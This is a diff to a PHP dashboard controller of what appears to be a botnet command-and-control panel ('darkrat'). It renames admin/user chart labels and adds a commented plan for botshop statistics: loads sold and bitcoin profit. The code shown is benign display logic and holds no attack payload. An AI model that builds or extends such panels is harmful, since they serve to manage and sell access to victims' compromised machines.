@@ -61,6 +61,7 @@ class Main{
 
     //dashboard function
     public function index(){
+
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
@@ -120,11 +121,13 @@ class Main{
             $AdminOrNotValues = array();
             foreach($adminOrNotStats as $status){
                 if($status["isadmin"] == "false"){
-                    $status["isadmin"] = "Non Admin: ".$status["cnt"];
+                    $status["label"] = "Users";
+                    //$status["isadmin"] = "Non Admin: ".$status["cnt"];
                 }else{
-                    $status["isadmin"] = "Admins: ".$status["cnt"];
+                    //$status["isadmin"] = "Admins: ".$status["cnt"];
+                    $status["label"] = "Admins";
                 }
-                $AdminOrNotLables[] = $status["isadmin"];
+                $AdminOrNotLables[] = $status["label"];
                 $AdminOrNotValues[] = $status["cnt"];
             }
             //======================== ADMIN OR NOT HANDLER END========================
@@ -139,6 +142,16 @@ class Main{
                 $ArchitecturetValues[] = $status["cnt"];
             }
             //======================== Architecture Stats END ========================
+
+        /*
+  * <!--
+Botshop Transactions(all)
+Loads sold (all)
+Botshop Proift btc $
+
+-->
+  */
+
             $GLOBALS["tpl"]->assign("allbots", $allbots);
             $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
             $GLOBALS["tpl"]->assign("botcount", $botcount);
